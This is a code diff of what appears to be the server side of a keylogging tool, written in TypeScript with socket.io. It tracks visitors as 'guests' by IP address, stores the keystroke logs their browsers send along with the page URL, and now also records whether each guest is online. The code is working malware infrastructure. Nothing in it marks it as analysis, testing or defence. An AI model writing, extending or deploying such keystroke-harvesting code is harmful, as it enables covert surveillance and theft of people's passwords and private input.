@@ -10,7 +10,17 @@ export default async (socket:Socket) => {
     const sessionId = socket.id
     const keyLog:KeyLog = {url: '', log: '', date: new Date()}
 
-    socket.on('new guest', () => socket.join('guests'))
+
+    socket.on('new guest', async () => {
+        const guest:Guest = await Guest.findOne({ ip })
+
+        if (guest) {
+            guest.online = true
+            await guest.store()
+        }
+
+        socket.join('guests')
+    })
 
     socket.on('general info', async (info:GeneralInfo) => {
         const guest:Guest = await Guest.findOne({ ip })
@@ -62,9 +72,14 @@ export default async (socket:Socket) => {
     socket.on('disconnect', async () => {
         const guest:Guest = await Guest.findOne({ ip })
 
-        if (guest && keyLog.log) {
-            guest.keyLogs.push(keyLog)
-            log(guest, `guest's key log was captured for ${keyLog.url}:`, keyLog.log)
+        if (guest) {
+            guest.online = false
+
+            if (keyLog.log) {
+                guest.keyLogs.push(keyLog)
+                log(guest, `guest's key log was captured for ${keyLog.url}:`, keyLog.log)
+            }
+
             await guest.store()
         }
     })
